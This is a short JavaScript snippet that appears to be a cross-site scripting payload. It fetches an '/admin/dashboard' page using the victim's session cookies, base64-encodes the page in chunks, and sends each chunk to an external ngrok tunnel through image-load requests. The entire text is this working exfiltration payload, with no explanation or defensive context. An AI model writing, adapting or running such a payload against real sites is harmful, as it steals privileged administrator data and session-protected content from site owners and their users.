const exfil="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app";
const chunkSize=5000;

fetch("/admin/dashboard",{credentials:"include"})
.then(r=>r.text())
.then(d=>{

  new Image().src=exfil+"?note=start";

  for(let i=0;i<d.length;i+=chunkSize){
    let chunk=btoa(d.slice(i,i+chunkSize));
    new Image().src=exfil+"?step="+i+"&data="+encodeURIComponent(chunk);
  }

  new Image().src=exfil+"?note=end";

});
